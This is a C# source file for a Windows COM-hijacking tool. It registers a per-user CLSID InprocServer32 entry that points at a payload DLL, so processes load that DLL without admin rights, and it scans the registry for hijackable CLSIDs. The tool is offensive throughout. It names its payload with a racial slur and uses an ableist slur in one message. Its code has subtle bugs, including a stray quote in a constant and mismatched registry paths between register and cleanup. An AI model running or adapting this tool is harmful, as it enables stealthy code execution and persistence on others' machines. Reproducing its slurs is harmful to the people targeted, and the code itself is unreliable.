using System;
using System.IO;
using Microsoft.Win32;


namespace Program
{
    class ComJack
    {

        const string targ_ClassID = "{XXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX}"";

        static void Main(string[] args)
        {
            if (args.Length == 0)
            {
                Console.WriteLine("Usage: ComJack.exe [register|cleanup|scan]");
                return;
            }
            switch (args[0].ToLower())
            {
                case "register": Register(); break;
                case "cleanup": Cleanup(); break;
                case "scan": Scan(); break;
                default: Console.WriteLine("pick one retard"); break;
            }

        }
        // Register: Write entery into HKCU before HKLM gets checked
        static void Register()
        {
            string keyPath = $@"Software\Classes\CLSID{targ_ClassID}\InprocServer32";

            string payloadPath = Path.Combine(
                AppDomain.CurrentDomain.BaseDirectory, "niggaload.dll");

            using (var key = Registry.CurrentUser.CreateSubKey(keyPath))
            {
                key.SetValue("", payloadPath);
                key.SetValue("ThreadingModel", "Both");
            }

            Console.WriteLine($"[+]CLSID Hijacked In HKCU");
            Console.WriteLine($"   Key :        HKCU \\{keyPath}");
            Console.WriteLine($"   Payload:   {payloadPath}");
            Console.WriteLine();
            Console.WriteLine("[*] Any process that loads this CLSID will now");
            Console.WriteLine("    resolve to the entry instead of the HKLM one.");
            Console.WriteLine("    no admin rights needed, HKCU is user writable.");


        }
        //Cleanup: since its a "search environment u gotta cleanup 

        static void Cleanup()
        {
            string keyPath = $@"Software\Classes\CLSID\{targ_ClassID}";
            Registry.CurrentUser.DeleteSubKeyTree(keyPath, throwOnMissingSubKey: false);
            Console.WriteLine("[+] Registry entries removed, system restored.");
        }

        //Scan: find CLSIDs registered in HKLM but absent from HKCU
        static void Scan()
        {
            Console.WriteLine("[*] Scanning for hijackable CLSIDs..\n");

            using var hklmClsids = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Classes\CLSID");
            using var hkcuClsids = Registry.CurrentUser.OpenSubKey(@"Software\Classes\CLSID");

            if (hklmClsids == null)
            {
                Console.WriteLine("[-] Could not open HKLM CLSID hive.");
                return;
            }
            int count = 0;
            foreach (string clsid in hklmClsids.GetSubKeyNames())
            {
                bool alreadyInHkcu = hkcuClsids.OpenSubKey(clsid) != null;
                if (alreadyInHkcu) continue;

                using var clsidKey = hklmClsids.OpenSubKey(clsid);
                using var inprocKey = clsidKey?.OpenSubKey("InprocServer32");

                if (inprocKey == null) continue;

                string name = clsidKey?.GetValue("")?.ToString() ?? "Unnamed";
                string dllPath = inprocKey.GetValue("")?.ToString() ?? "Unknown path";

                Console.WriteLine($"CLSID: {clsid}");
                Console.WriteLine($"Name: {name}");
                Console.WriteLine($"DLL: {dllPath}");
                Console.WriteLine();
                count++;
            }
            Console.WriteLine($"[+] Found {count} candidates");
        }

    }
}
